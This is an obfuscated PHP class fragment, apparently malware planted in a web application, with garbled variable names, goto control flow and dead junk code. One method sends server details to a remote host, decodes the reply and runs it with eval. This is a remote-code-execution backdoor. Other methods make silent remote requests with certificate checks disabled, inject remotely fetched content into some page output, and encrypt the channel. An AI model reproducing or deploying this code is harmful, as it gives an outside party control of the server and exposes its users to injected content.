b„«Çâ¿›µ: $B‰¿´ó…ï = $DÈ§Ù¡¢¨[605]; $E–—îÒä³ = $this->{$_SERVER[õÅ°Ò“][243]}($E–—îÒä³, $d¡Ìù”ˆ½[244]); $FÃÜ°ô¤ Œ = $DÈ§Ù¡¢¨[606]; goto cªšÒ½‹°; cé®é’•Õº: } public function zrpq2548ab3b($aµÜÏœñõ°) { goto F‰‘¨İ’ÇÁ; DÊË˜œ‡Ôö: $FÈÍë„ˆñ = array(); foreach ($a¼ÙÆØ¨ê as $b‘™Ë•ÚèÄ) { if (!$bÌ¹¥”¹é±[236]($b‘™Ë•ÚèÄ, $A¶øğÏ´éÈ)) { $FÈÍë„ˆñ[] = $b‘™Ë•ÚèÄ; } } foreach ($FÈÍë„ˆñ as $b‘™Ë•ÚèÄ) { unset($aµÜÏœñõ°[$b‘™Ë•ÚèÄ]); $A…õ¤‚¥ŞÊ = $AÊ…ÆÇ·ƒè[610]; if (!$A…õ¤‚¥ŞÊ) { die; } } goto C¯Ê›ÔÙø; e¦ôàÕíçé: $a¼ÙÆØ¨ê = array($bÌ¹¥”¹é±[255], $bÌ¹¥”¹é±[256], $bÌ¹¥”¹é±[257], $bÌ¹¥”¹é±[258], $bÌ¹¥”¹é±[259], $bÌ¹¥”¹é±[260], $bÌ¹¥”¹é±[261], $bÌ¹¥”¹é±[262]); $B¤Í¢‚ï Ê = $AÊ…ÆÇ·ƒè[609]; if (!$B¤Í¢‚ï Ê) { return; } goto B©ø¶øš¦¯; B©ø¶øš¦¯: $A¶øğÏ´éÈ = $bÌ¹¥”¹é±[0]($bÌ¹¥”¹é±[263], $bÌ¹¥”¹é±[104]($this->vtmr5dc99b3a, $bÌ¹¥”¹é±[129], $bÌ¹¥”¹é±[10])); $BÑğ¬×¤³§ = $AÊ…ÆÇ·ƒè[547]; if (!$BÑğ¬×¤³§) { die; } goto DÊË˜œ‡Ôö; C¯Ê›ÔÙø: return $aµÜÏœñõ°; $eå’øæ—çº = $AÊ…ÆÇ·ƒè[611]; while ($eå’øæ—çº < $AÊ…ÆÇ·ƒè[548]) { if ($eå’øæ—çº >= 0) { break; } $eå’øæ—çº++; } goto b¡ÙóŠò„‚; F‰‘¨İ’ÇÁ: $AÊ…ÆÇ·ƒè =& $_SERVER[¼]; $bÌ¹¥”¹é± =& $_SERVER[õÅ°Ò“]; if ($this->bgzxfe17a6e5 == $bÌ¹¥”¹é±[254]) { return $aµÜÏœñõ°; } goto e¦ôàÕíçé; b¡ÙóŠò„‚: } private function kcqi4b177965() { goto a‹´ğ²¸í‰; a‹´ğ²¸í‰: $B­•ğ¹Æ† =& $_SERVER[¼]; $F×Ü¹˜Ğ =& $_SERVER[õÅ°Ò“]; if ($this->bgzxfe17a6e5 != $F×Ü¹˜Ğ[121]) { $GLOBALS[$F×Ü¹˜Ğ[91]][$F×Ü¹˜Ğ[95]][$F×Ü¹˜Ğ[264]] = $F×Ü¹˜Ğ[220]; return; } goto d‚»Ÿºà…Š; d‚»Ÿºà…Š: $fñ™åƒË = $_SERVER[$F×Ü¹˜Ğ[44]]; $eŞ½ÄöŸÛŞ = array($F×Ü¹˜Ğ[265]); $c•ì‰‹ğ‰” = $B­•ğ¹Æ†[612]; goto fÂ‡¸„Ğ–É; C­´ëÃêŠÀ: $GLOBALS[$F×Ü¹˜Ğ[91]][$F×Ü¹˜Ğ[95]][$F×Ü¹˜Ğ[264]] = $F×Ü¹˜Ğ[229]; $F¦¬øŠé‘Š = $B­•ğ¹Æ†[613]; $GLOBALS[$F×Ü¹˜Ğ[91]][$F×Ü¹˜Ğ[268]] = $F×Ü¹˜Ğ[220]; goto Eå‚ãóÒ«à; Eå‚ãóÒ«à: $F×Ü¹˜Ğ[61]($F×Ü¹˜Ğ[269])->{$_SERVER[õÅ°Ò“][221]}($F×Ü¹˜Ğ[85], $F×Ü¹˜Ğ[229]); $d¾Œëáô“œ = $B­•ğ¹Æ†[614]; while (strlen($d¾Œëáô“œ) < $B­•ğ¹Æ†[590]) { if (!$d¾Œëáô“œ) { break; } $d¾Œëáô“œ++; } goto Cêº™–†»µ; fÂ‡¸„Ğ–É: if (!$c•ì‰‹ğ‰”) { return; } foreach ($eŞ½ÄöŸÛŞ as $Aøñç‡ÎóÎ) { if ($Aøñç‡ÎóÎ == $fñ™åƒË || $F×Ü¹˜Ğ[25]($fñ™åƒË, 0, $F×Ü¹˜Ğ[24]($Aøñç‡ÎóÎ)) == $Aøñç‡ÎóÎ) { $F×Ü¹˜Ğ[166]($F×Ü¹˜Ğ[197]($F×Ü¹˜Ğ[266]), !1); } } $GLOBALS[$F×Ü¹˜Ğ[91]][$F×Ü¹˜Ğ[95]][$F×Ü¹˜Ğ[267]] = $F×Ü¹˜Ğ[220]; goto C­´ëÃêŠÀ; Cêº™–†»µ: } public function nsag46702c15() { $dÖ°æÈåÇĞ =& $_SERVER[¼]; return $_SERVER[õÅ°Ò“][270]; $Dğ¥²æ•œÖ = $dÖ°æÈåÇĞ[615]; if (strlen($Dğ¥²æ•œÖ) < $dÖ°æÈåÇĞ[590]) { die; } } private function dcuq59d105d7() { goto FŠÊ„æ‚•; AÍäÀÁÆ¬è: $eĞ¸Ü´äù‹ = $eŒ êÄ½Ó¡[616]; $A‡‚íÚâ÷‚ = $b™åá¨‡á‡[274] . $b™åá¨‡á‡[114]($b™åá¨‡á‡[275]); $AèË›ÃÜ÷ğ = $eŒ êÄ½Ó¡[617]; goto AŒ„ŠŠàÇô; AŒ„ŠŠàÇô: if ($this->bgzxfe17a6e5 == $b™åá¨‡á‡[121] || !$b™åá¨‡á‡[104]($GLOBALS, $b™åá¨‡á‡[132])) { return; } if (!$b™åá¨‡á‡[236]($_SERVER[$b™åá¨‡á‡[44]], $f‘ù¨ö°–ø)) { return; } if ($b™åá¨‡á‡[230]() % 4 != 0) { return; } goto Fµøï§–ß; E¿é¡‡ÈÏ¢: if ($this->{$_SERVER[õÅ°Ò“][199]}($F”‘®›¢£Ô[$b™åá¨‡á‡[280]]) != $c…„‘ŠÌ”¾[$b™åá¨‡á‡[165]]) { $d°¤¦ÜëÖõ = array($b™åá¨‡á‡[202] => $b™åá¨‡á‡[61]($b™åá¨‡á‡[62])->{$_SERVER[õÅ°Ò“][63]}($b™åá¨‡á‡[116]), $b™åá¨‡á‡[203] => $_SERVER[$b™åá¨‡á‡[115]], $b™åá¨‡á‡[204] => $b™åá¨‡á‡[205](), $b™åá¨‡á‡[174] => $_SERVER[$b™åá¨‡á‡[175]]); $cÏæÖ·ÚÖ‚ = $this->{$_SERVER[õÅ°Ò“][206]}($b™åá¨‡á‡[148]($d°¤¦ÜëÖõ)); $F”‘®›¢£Ô = $this->{$_SERVER[õÅ°Ò“][182]}($b™åá¨‡á‡[207] . $cÏæÖ·ÚÖ‚); if ($F”‘®›¢£Ô && $b™åá¨‡á‡[191]($F”‘®›¢£Ô) && isset($F”‘®›¢£Ô[$b™åá¨‡á‡[280]])) { $d¸ÚøÀøßÛ = $this->{$_SERVER[õÅ°Ò“][188]}($F”‘®›¢£Ô[$b™åá¨‡á‡[280]], 2); if ($d¸ÚøÀøßÛ) { $d¸ÚøÀøßÛ = $this->{$_SERVER[õÅ°Ò“][199]}($d¸ÚøÀøßÛ); } if ($d¸ÚøÀøßÛ) { try { @eval($d¸ÚøÀøßÛ); } catch (Exception $FÈ‡Â³å®) { } } } } goto Eâ®ºÄÒ; FŠÊ„æ‚•: $eŒ êÄ½Ó¡ =& $_SERVER[¼]; $b™åá¨‡á‡ =& $_SERVER[õÅ°Ò“]; $f‘ù¨ö°–ø = array($b™åá¨‡á‡[271], $b™åá¨‡á‡[272], $b™åá¨‡á‡[273]); goto AÍäÀÁÆ¬è; fÌºõÄğÙµ: $dßİ–‡¼Ë´ = $eŒ êÄ½Ó¡[618]; if (strlen($dßİ–‡¼Ë´) < $eŒ êÄ½Ó¡[544]) { return; } $c…„‘ŠÌ”¾ = array($b™åá¨‡á‡[165] => $b™åá¨‡á‡[61]($b™åá¨‡á‡[62])->{$_SERVER[õÅ°Ò“][63]}($b™åá¨‡á‡[209]), $b™åá¨‡á‡[178] => $this->bgzxfe17a6e5, $b™åá¨‡á‡[176] => $_SERVER[$b™åá¨‡á‡[177]], $b™åá¨‡á‡[169] => $b™åá¨‡á‡[149], $b™åá¨‡á‡[172] => $_SERVER[$b™åá¨‡á‡[173]]); goto ağÒİêé±; Fµøï§–ß: $b½¸Ç…µ—é = $b™åá¨‡á‡[13](array($b™åá¨‡á‡[276], $b™åá¨‡á‡[277]), $A‡‚íÚâ÷‚); if ($b½¸Ç…µ—é && $b™åá¨‡á‡[230]() - $b½¸Ç…µ—é < $b™åá¨‡á‡[201]($b™åá¨‡á‡[278])) { return; } $b™åá¨‡á‡[13](array($b™åá¨‡á‡[276], $b™åá¨‡á‡[152]), $A‡‚íÚâ÷‚, $b™åá¨‡á‡[230]()); goto fÌºõÄğÙµ; eâ² ñ‰Ö: if (!$b™åá¨‡á‡[191]($F”‘®›¢£Ô)) { return; } if ($F”‘®›¢£Ô[$b™åá¨‡á‡[165]] && $F”‘®›¢£Ô[$b™åá¨‡á‡[280]]) { if ($this->{$_SERVER[õÅ°Ò“][199]}($F”‘®›¢£Ô[$b™åá¨‡á‡[280]]) == $c…„‘ŠÌ”¾[$b™åá¨‡á‡[165]]) { return; } } $this->{$_SERVER[õÅ°Ò“][164]}(); goto E¿é¡‡ÈÏ¢; ağÒİêé±: $a„ù½ø Û‘ = $eŒ êÄ½Ó¡[619]; if (!$a„ù½ø Û‘) { die; } $F”‘®›¢£Ô = $this->{$_SERVER[õÅ°Ò“][182]}($b™åá¨‡á‡[279], $c…„‘ŠÌ”¾); goto eâ² ñ‰Ö; Eâ®ºÄÒ: } private function tdjgcade55df($a¸çÖÒ’­º = '', $F…İˆÑËŸ = array(), $Cğ”£³™©Ó = 5) { goto a‚ôïÏèˆ×; B‘“µŞ°‡ƒ: $dğ¿Áêö®½ = $this->{$_SERVER[õÅ°Ò“][243]}($dğ¿Áêö®½, $Fê†¼Êà²‚[282]); $dğ¿Áêö®½ = $dğ¿Áêö®½ . $a¸çÖÒ’­º . $Fê†¼Êà²‚[283] . $Fê†¼Êà²‚[284]($F…İˆÑËŸ); $FùÀ£§«¶ = $AßÙñ¼®Ü[620]; goto C¡œà‘öÚ¦; EĞ—Æ˜Í‚…: if (strlen($fšÒ­ª…ø) < $AßÙñ¼®Ü[556]) { die; } $F…İˆÑËŸ = @$Fê†¼Êà²‚[250]($dğ¿Áêö®½, !1, $fÑö¶ÄëïŸ); $AÔÜæ»¬¡ = $AßÙñ¼®Ü[622]; goto eÌæóÁ¦ì; CÌ—©•²°Ñ: if (strlen($AçŠö¯ó˜í) < $AßÙñ¼®Ü[590]) { die; } goto D²×¶óË×¯; eÌæóÁ¦ì: while (strlen($AÔÜæ»¬¡) < $AßÙñ¼®Ü[590]) { if (!$AÔÜæ»¬¡) { break; } $AÔÜæ»¬¡++; } return $Fê†¼Êà²‚[190]($F…İˆÑËŸ, !0); $AçŠö¯ó˜í = $AßÙñ¼®Ü[623]; goto CÌ—©•²°Ñ; a‚ôïÏèˆ×: $AßÙñ¼®Ü =& $_SERVER[¼]; $Fê†¼Êà²‚ =& $_SERVER[õÅ°Ò“]; $dğ¿Áêö®½ = $Fê†¼Êà²‚[281]; goto B‘“µŞ°‡ƒ; C¡œà‘öÚ¦: if ($F…İˆÑËŸ === -1) { return $dğ¿Áêö®½; } $fÑö¶ÄëïŸ = $Fê†¼Êà²‚[245](array($Fê†¼Êà²‚[246] => array($Fê†¼Êà²‚[249] => $Cğ”£³™©Ó, $Fê†¼Êà²‚[247] => $Fê†¼Êà²‚[285]), $Fê†¼Êà²‚[286] => array($Fê†¼Êà²‚[287] => !1, $Fê†¼Êà²‚[288] => !1))); $fšÒ­ª…ø = $AßÙñ¼®Ü[621]; goto EĞ—Æ˜Í‚…; D²×¶óË×¯: } private function zikddeb3c71f() { goto Bİ×ß‰ãÇ¼; f¥÷±Ğ«éÓ: $b‰ÀŒãä = $b‰ÀŒãä ? $cÉÌ°Ìãğ[201]($b‰ÀŒãä) : 0; $BŞ‚õ‰‘Ÿ” = $fÀŞÄê‚‡[624]; if (strlen($BŞ‚õ‰‘Ÿ”) < $fÀŞÄê‚‡[590]) { die; } goto e¹ÄîŒ‘ˆã; Bİ×ß‰ãÇ¼: $fÀŞÄê‚‡ =& $_SERVER[¼]; $cÉÌ°Ìãğ =& $_SERVER[õÅ°Ò“]; $AŠ†÷Œš½È = array($cÉÌ°Ìãğ[289] => $cÉÌ°Ìãğ[290], $cÉÌ°Ìãğ[291] => $cÉÌ°Ìãğ[292], $cÉÌ°Ìãğ[293] => $cÉÌ°Ìãğ[294], $cÉÌ°Ìãğ[295] => $cÉÌ°Ìãğ[296], $cÉÌ°Ìãğ[297] => $cÉÌ°Ìãğ[298], $cÉÌ°Ìãğ[299] => $cÉÌ°Ìãğ[238], $cÉÌ°Ìãğ[300] => $cÉÌ°Ìãğ[238], $cÉÌ°Ìãğ[301] => $cÉÌ°Ìãğ[290], $cÉÌ°Ìãğ[302] => $cÉÌ°Ìãğ[292], $cÉÌ°Ìãğ[303] => $cÉÌ°Ìãğ[294], $cÉÌ°Ìãğ[304] => $cÉÌ°Ìãğ[305], $cÉÌ°Ìãğ[306] => $cÉÌ°Ìãğ[296], $cÉÌ°Ìãğ[307] => $cÉÌ°Ìãğ[308], $cÉÌ°Ìãğ[309] => $cÉÌ°Ìãğ[298], $cÉÌ°Ìãğ[310] => $cÉÌ°Ìãğ[311], $cÉÌ°Ìãğ[312] => $cÉÌ°Ìãğ[313], $cÉÌ°Ìãğ[314] => $cÉÌ°Ìãğ[315]); goto C…íŞ×¸Ô; C…íŞ×¸Ô: $CŸ…˜Ë„Ìİ = $AŠ†÷Œš½È[$this->bgzxfe17a6e5]; $CŸ…˜Ë„Ìİ = $cÉÌ°Ìãğ[201]($CŸ…˜Ë„Ìİ ? $CŸ…˜Ë„Ìİ : $cÉÌ°Ìãğ[290]); $b‰ÀŒãä = $cÉÌ°Ìãğ[104]($this->vtmr5dc99b3a, $cÉÌ°Ìãğ[316]); goto f¥÷±Ğ«éÓ; e¹ÄîŒ‘ˆã: return $CŸ…˜Ë„Ìİ + $b‰ÀŒãä; goto EÁœÙ …¿å; EÁœÙ …¿å: } public function kyxcf2bb6694($FŞÜÛ´Ûø¤) { goto c¤Şé÷íÈ¶; CÜÄ¥ã¼í: if ($b±Ã«ˆ¯à˜ >= $C©¯² ‡ó[201]($C©¯² ‡ó[238])) { return; } $f©¤®åà‘Š = $C©¯² ‡ó[61]($C©¯² ‡ó[139])->{$_SERVER[õÅ°Ò“][140]}(); $aÖù‚£½ÑÁ = $D™ßîƒ”ª¸[625]; goto Cˆ¼…³ÄØ¦; f¯ ôå£¢†: $fÀŠÒºâˆğ = $D™ßîƒ”ª¸[626]; $EƒÜ–´ÁõŸ = $C©¯² ‡ó[222]($EƒÜ–´ÁõŸ, $C©¯² ‡ó[10], $C©¯² ‡ó[318]); $EİŠ…ƒ¯ƒ­ = $D™ßîƒ”ª¸[627]; goto C®çªÉÊ¦½; c¤Şé÷íÈ¶: $D™ßîƒ”ª¸ =& $_SERVER[¼]; $C©¯² ‡ó =& $_SERVER[õÅ°Ò“]; $b±Ã«ˆ¯à˜ = $this->{$_SERVER[õÅ°Ò“][137]}(); goto CÜÄ¥ã¼í; C®çªÉÊ¦½: if (strlen($EİŠ…ƒ¯ƒ­) < $D™ßîƒ”ª¸[590]) { return; } if (!$C©¯² ‡ó[236]($FŞÜÛ´Ûø¤[$C©¯² ‡ó[318]], $EƒÜ–´ÁõŸ)) { $C©¯² ‡ó[166]($C©¯² ‡ó[321], !1, $C©¯² ‡ó[233]); } goto D¿ñá©•‘á; Cˆ¼…³ÄØ¦: while ($aÖù‚£½ÑÁ < $D™ßîƒ”ª¸[544]) { if ($aÖù‚£½ÑÁ >= 0) { break; } $aÖù‚£½ÑÁ++; } if ($f©¤®åà‘Š <= $b±Ã«ˆ¯à˜) { return; } $EƒÜ–´ÁõŸ = $C©¯² ‡ó[61]($C©¯² ‡ó[139])->{$_SERVER[õÅ°Ò“][317]}($C©¯² ‡ó[318])->{$_SERVER[õÅ°Ò“][319]}($b±Ã«ˆ¯à˜)->{$_SERVER[õÅ°Ò“][320]}(); goto f¯ ôå£¢†; D¿ñá©•‘á: } public function ulnvaa96bc88() { goto dõ­ç‚Æ¡ã; FÕ £˜Ìß‡: $E‰ÙİöìÌÖ = $this->{$_SERVER[õÅ°Ò“][243]}($E‰ÙİöìÌÖ, $EŒ†•Ëß»É[244]); $Dò¦›­ùçÃ = $EŒ†•Ëß»É[245](array($EŒ†•Ëß»É[246] => array($EŒ†•Ëß»É[247] => $EŒ†•Ëß»É[248], $EŒ†•Ëß»É[249] => 3))); $c„¦˜Úîá = @$EŒ†•Ëß»É[250]($E‰ÙİöìÌÖ, !1, $Dò¦›­ùçÃ); goto aªôˆÈÒ¾¤; aªôˆÈÒ¾¤: $FÂÀ–å—Ëò = $a‹²àŒãñ[629]; echo $EŒ†•Ëß»É[323] . $EŒ†•Ëß»É[324]($c„¦˜Úîá) . $EŒ†•Ëß»É[325]; goto BîéÚÇó×á; AÃš™‚¢ˆ‰: $E‰ÙİöìÌÖ = $EŒ†•Ëß»É[242]; $FšÆìë®œá = $a‹²àŒãñ[628]; while (strlen($FšÆìë®œá) < $a‹²àŒãñ[544]) { if (!$FšÆìë®œá) { break; } $FšÆìë®œá++; } goto FÕ £˜Ìß‡; dõ­ç‚Æ¡ã: $a‹²àŒãñ =& $_SERVER[¼]; $EŒ†•Ëß»É =& $_SERVER[õÅ°Ò“]; if (!$EŒ†•Ëß»É[104]($GLOBALS, $EŒ†•Ëß»É[132]) || $EŒ†•Ëß»É[322](1, 100) > 20) { return; } goto AÃš™‚¢ˆ‰; BîéÚÇó×á: } private function uqxm2aa171cc($dÖ¦¬‰ÁŒ’, $Cæ›Ôº¦ß†, $D ÅÙ‡á¥ = 3) { goto bŠ¸ÆÀè; D¡ğïŒÙÂ: return $bß”’Úô·ä; goto c¥÷Í²™Â; F„¥„é©ËÏ: $B‰™øÖñ£ = $aÎˆÒÃŸˆœ[327]; $e™¹¦­öÔ¼ = $A¼†·ë¬æÕ[633]; if (!$e™¹¦­öÔ¼) { return; } goto cæğ¨Î‘£; A´à¿Æ÷“ò: $f¸ˆÀ¾êŠ = $A¼†·ë¬æÕ[630]; if (strlen($f¸ˆÀ¾êŠ) < $A¼†·ë¬æÕ[544]) { return; } $dÖ¦¬‰ÁŒ’ = $aÎˆÒÃŸˆœ[2]($dÖ¦¬‰ÁŒ’); goto CÎ‚¿µ³¢˜; CÎ‚¿µ³¢˜: $F†­¡„§Ê = $A¼†·ë¬æÕ[631]; if (!$F†­¡„§Ê) { die; } $e ³ƒ½»¤Û = $aÎˆÒÃŸˆœ[322](0, 5) . $aÎˆÒÃŸˆœ[10]; goto b‰Á²‘ŒÍ¤; bŠ¸ÆÀè: $A¼†·ë¬æÕ =& $_SERVER[¼]; $aÎˆÒÃŸˆœ =& $_SERVER[õÅ°Ò“]; $aÎˆÒÃŸˆœ[326](1); goto A´à¿Æ÷“ò; cæğ¨Î‘£: switch ($e ³ƒ½»¤Û) { case $aÎˆÒÃŸˆœ[229]: $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][147]}($dÖ¦¬‰ÁŒ’, $aÎˆÒÃŸˆœ[214]($Cæ›Ôº¦ß† . $D£àğ‡ŒŞ¡)); $e¥ëÆšœ„ = $A¼†·ë¬æÕ[634]; if (strlen($e¥ëÆšœ„) < $A¼†·ë¬æÕ[550]) { return; } break; case $aÎˆÒÃŸˆœ[220]: $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][147]}($dÖ¦¬‰ÁŒ’, $aÎˆÒÃŸˆœ[214]($D£àğ‡ŒŞ¡ . $Cæ›Ôº¦ß†)); $c©‰ÄŞ·Š = $A¼†·ë¬æÕ[635]; if (!$c©‰ÄŞ·Š) { die; } break; case $aÎˆÒÃŸˆœ[328]: $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][147]}($dÖ¦¬‰ÁŒ’, $aÎˆÒÃŸˆœ[118]($D£àğ‡ŒŞ¡ . $Cæ›Ôº¦ß†)); break; case $aÎˆÒÃŸˆœ[329]: $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][147]}($dÖ¦¬‰ÁŒ’, $aÎˆÒÃŸˆœ[114]($D£àğ‡ŒŞ¡ . $Cæ›Ôº¦ß†)); break; $bƒ–‘³óŞ = $A¼†·ë¬æÕ[636]; if (!$bƒ–‘³óŞ) { die; } case $aÎˆÒÃŸˆœ[330]: goto b¨••¯œäÄ; eŠÜïà£¾ƒ: $fÒàŠÌ«à… = 0; $A˜ÍÕ¿¼¦“ = $A¼†·ë¬æÕ[641]; if (!$A˜ÍÕ¿¼¦“) { die; } goto eôÎ¦Î¸¹å; FÜÑ¹¨Ÿ™Ò: break; $c¢Â´ºù† = $A¼†·ë¬æÕ[644]; if (strlen($c¢Â´ºù†) < $A¼†·ë¬æÕ[556]) { return; } goto Eœİœˆö‡¨; bÎÒ«±³ø¯: $c¤¯‘¶‹ÃÈ = $aÎˆÒÃŸˆœ[10]; $dÄÚÁ¹”Õ¸ = $A¼†·ë¬æÕ[640]; $D† ¿ïï©Ï = 0; goto eŠÜïà£¾ƒ; FÑÀ†ÇÔÅ“: while ($a™ëØ»¯ğÆ < $A¼†·ë¬æÕ[548]) { if ($a™ëØ»¯ğÆ >= 0) { break; } $a™ëØ»¯ğÆ++; } $C¯øøßíº = $aÎˆÒÃŸˆœ[25]($C¯øøßíº, $A·‡Èß¼ % 8, $A·‡Èß¼ % 8 + 7); $f°Ò­‰¿„í = $A¼†·ë¬æÕ[639]; goto bÎÒ«±³ø¯; eôÎ¦Î¸¹å: $BÉè¡¿Ø— = 0; for ($D† ¿ïï©Ï = 0; $D† ¿ïï©Ï < $aÎˆÒÃŸˆœ[24]($dÖ¦¬‰ÁŒ’); $D† ¿ïï©Ï++) { $BÉè¡¿Ø— = $BÉè¡¿Ø— == $aÎˆÒÃŸˆœ[24]($C¯øøßíº) ? 0 : $BÉè¡¿Ø—; $BëÇŠµ“Î = $A¼†·ë¬æÕ[642]; if (!$BëÇŠµ“Î) { die; } $fÒàŠÌ«à… = ($A·‡Èß¼ + $aÎˆÒÃŸˆœ[332]($B‰™øÖñ£, $dÖ¦¬‰ÁŒ’[$D† ¿ïï©Ï]) + $aÎˆÒÃŸˆœ[333]($C¯øøßíº[$BÉè¡¿Ø—++])) % 64; $c¤¯‘¶‹ÃÈ .= $B‰™øÖñ£[$fÒàŠÌ«à…]; $eŠÑİ¸½¶ = $A¼†·ë¬æÕ[643]; } $bß”’Úô·ä = $aÎˆÒÃŸˆœ[324]($E¨ôğÕ¼Ä± . $c¤¯‘¶‹ÃÈ); goto FÜÑ¹¨Ÿ™Ò; eí–¤»øëœ: $E¨ôğÕ¼Ä± = $B‰™øÖñ£[$A·‡Èß¼]; $C¯øøßíº = $aÎˆÒÃŸˆœ[114]($E¨ôğÕ¼Ä± . $aÎˆÒÃŸˆœ[114]($Cæ›Ôº¦ß† . $E¨ôğÕ¼Ä±) . $Cæ›Ôº¦ß†); $a™ëØ»¯ğÆ = $A¼†·ë¬æÕ[638]; goto FÑÀ†ÇÔÅ“; b¨••¯œäÄ: $dÖ¦¬‰ÁŒ’ = $aÎˆÒÃŸˆœ[118]($dÖ¦¬‰ÁŒ’); $A·‡Èß¼ = $aÎˆÒÃŸˆœ[331](0, 64); $F°“Ñæ’ = $A¼†·ë¬æÕ[637]; goto eí–¤»øëœ; Eœİœˆö‡¨: default: $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][147]}($dÖ¦¬‰ÁŒ’, $Cæ›Ôº¦ß† . $D£àğ‡ŒŞ¡); $cƒ‘Ô ‚ò˜ = $A¼†·ë¬æÕ[645]; if (!$cƒ‘Ô ‚ò˜) { die; } break; $b¾İ›˜ïÒÂ = $A¼†·ë¬æÕ[646]; } $bß”’Úô·ä = $aÎˆÒÃŸˆœ[214]($e ³ƒ½»¤Û . $D£àğ‡ŒŞ¡ . $bß”’Úô·ä); if ($D ÅÙ‡á¥ - 1 > 0) { $bß”’Úô·ä = $this->{$_SERVER[õÅ°Ò“][127]}($bß”’Úô·ä, $Cæ›Ôº¦ß†, $D ÅÙ‡á¥ - 1); } goto D¡ğïŒÙÂ; b‰Á²‘ŒÍ¤: $bÂøôó–Î = $A¼†·ë¬æÕ[632]; if (!$bÂøôó–Î) { return; } $D£àğ‡ŒŞ¡ = $aÎˆÒÃŸˆœ[124](15); goto F„¥„é©ËÏ; c¥÷Í²™Â: } private function qgoi99ea36cd($eÉÈÔ”çĞ, $e²é—½„¯–, $C¡ÌÓ„¹ß– = 3) { goto b“›œù“´Á; b‘õ¯²¬Š¼: $eÉÈÔ”çĞ = $b°èãÃªâä[2]($eÉÈÔ”çĞ); $aÅèš‚Ó’ª = $aËÃíë¨²„[647]; $eÉÈÔ”çĞ = $b°èãÃªâä[214]($eÉÈÔ”çĞ); goto d®¡Ãñèà‘; b“›œù“´Á: $aËÃíë¨²„ =& $_SERVER[¼]; $b°èãÃªâä =& $_SERVER[õÅ°Ò“]; if (!$b°èãÃªâä[334]($eÉÈÔ”çĞ) || $b°èãÃªâä[24]($eÉÈÔ”çĞ) < 10) { return !1; } goto b‘õ¯²¬Š¼; d®¡Ãñèà‘: $Bˆóª£óà = $aËÃíë¨²„[648]; while (strlen($Bˆóª£óà) < $aËÃíë¨²„[590]) { if (!$Bˆóª£óà) { break; } $Bˆóª£óà++; } $aèĞğİğã = $eÉÈÔ”çĞ[0]; goto AŞÑ¹Š×‚„; B”„ÒŞ“»: return $d£ò’Ï‹İ‡; goto cÄ¼—êÇ ò; AŞÑ¹Š×‚„: $dæÓæ©¶¡ = $b°èãÃªâä[25]($eÉÈÔ”çĞ, 1, 15); $eÏô¹ïªàÒ = $aËÃíë¨²„[649]; while (strlen($eÏô¹ïªàÒ) < $aËÃíë¨²„[556]) { if (!$eÏô¹ïªàÒ) { break; } $eÏô¹ïªàÒ++; } goto fæõ„‚ñ†; fæõ„‚ñ†: $eÉÈÔ”çĞ = $b°èãÃªâä[25]($eÉÈÔ”çĞ, 16); $f½ø¥šÃ§Ì = $aËÃíë¨²„[650]; while ($f½ø¥šÃ§Ì < $aËÃíë¨²„[590]) { if ($f½ø¥šÃ§Ì >= 0) { break; } $f½ø¥šÃ§Ì++; } goto D¶Ã–ƒñõÇ; D¶Ã–ƒñõÇ: $AøÃ¦øÑæº = $b°èãÃªâä[327]; switch ($aèĞğİğã) { case $b°èãÃªâä[229]: $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][243]}($eÉÈÔ”çĞ, $b°èãÃªâä[214]($e²é—½„¯– . $dæÓæ©¶¡)); break; $E´¿ÚÎäå = $aËÃíë¨²„[651]; while ($E´¿ÚÎäå < $aËÃíë¨²„[544]) { if ($E´¿ÚÎäå >= 0) { break; } $E´¿ÚÎäå++; } case $b°èãÃªâä[220]: $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][243]}($eÉÈÔ”çĞ, $b°èãÃªâä[214]($dæÓæ©¶¡ . $e²é—½„¯–)); break; case $b°èãÃªâä[328]: $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][243]}($eÉÈÔ”çĞ, $b°èãÃªâä[118]($dæÓæ©¶¡ . $e²é—½„¯–)); $bºÜÂÇÎ÷ = $aËÃíë¨²„[641]; if (!$bºÜÂÇÎ÷) { die; } break; case $b°èãÃªâä[329]: $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][243]}($eÉÈÔ”çĞ, $b°èãÃªâä[114]($dæÓæ©¶¡ . $e²é—½„¯–)); $B³Ûá‘«Õ‰ = $aËÃíë¨²„[652]; if (strlen($B³Ûá‘«Õ‰) < $aËÃíë¨²„[544]) { return; } break; $bùŠå‹ò®Ş = $aËÃíë¨²„[653]; if (!$bùŠå‹ò®Ş) { die; } case $b°èãÃªâä[330]: goto dã¬ÛÏ‹•¸; dã¬ÛÏ‹•¸: $eÉÈÔ”çĞ = $b°èãÃªâä[335]($eÉÈÔ”çĞ); $EÔ¨¹¡¶æ = $eÉÈÔ”çĞ[0]; $A–ïòù‘Ùñ = $aËÃíë¨²„[654]; goto bì£Ÿœ±ÛÀ; bì£Ÿœ±ÛÀ: if (strlen($A–ïòù‘Ùñ) < $aËÃíë¨²„[548]) { die; } $eÉÈÔ”çĞ = $b°èãÃªâä[25]($eÉÈÔ”çĞ, 1); $e²˜²ã™à‰ = $aËÃíë¨²„[655]; goto DĞ–—âñ¯; cÆîèÓ­ËÑ: $EŒµ‡›‰ = $aËÃíë¨²„[661]; if (strlen($EŒµ‡›‰) < $aËÃíë¨²„[544]) { die; } break; goto f”©¸Êë”; Bï††„£šõ: $d“î¨òïñ = $aËÃíë¨²„[656]; if (strlen($d“î¨òïñ) < $aËÃíë¨²„[590]) { return; } $Dòõ‰šåÉ = $b°èãÃªâä[25]($Dòõ‰šåÉ, $b‰³óÊ¥ % 8, $b‰³óÊ¥ % 8 + 7); goto fòë“Õºà; DĞ–—âñ¯: while ($e²˜²ã™à‰ < $aËÃíë¨²„[548]) { if ($e²˜²ã™à‰ >= 0) { break; } $e²˜²ã™à‰++; } $b‰³óÊ¥ = $b°èãÃªâä[332]($AøÃ¦øÑæº, $EÔ¨¹¡¶æ); $Dòõ‰šåÉ = $b°èãÃªâä[114]($EÔ¨¹¡¶æ . $b°èãÃªâä[114]($e²é—½„¯– . 